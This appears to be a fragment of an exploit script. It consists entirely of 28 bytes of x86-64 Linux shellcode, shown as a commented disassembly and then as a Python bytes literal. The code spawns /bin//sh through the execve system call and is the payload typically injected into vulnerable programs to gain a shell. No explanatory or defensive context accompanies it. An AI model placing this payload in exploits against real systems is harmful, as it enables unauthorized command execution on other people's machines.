#  0:   48 31 c0                xor    rax, rax
#  3:   50                      push   rax
#  4:   48 bf 2f 62 69 6e 2f 2f 73 68   movabs rdi, 0x68732f2f6e69622f
#  e:   57                      push   rdi
#  f:   48 89 e7                mov    rdi, rsp
# 12:   48 31 d2                xor    rdx, rdx
# 15:   48 31 f6                xor    rsi, rsi
# 18:   b0 3b                   mov    al, 0x3b
# 1a:   0f 05                   syscall
shellcode = b'\x48\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\xb0\x3b\x0f\x05'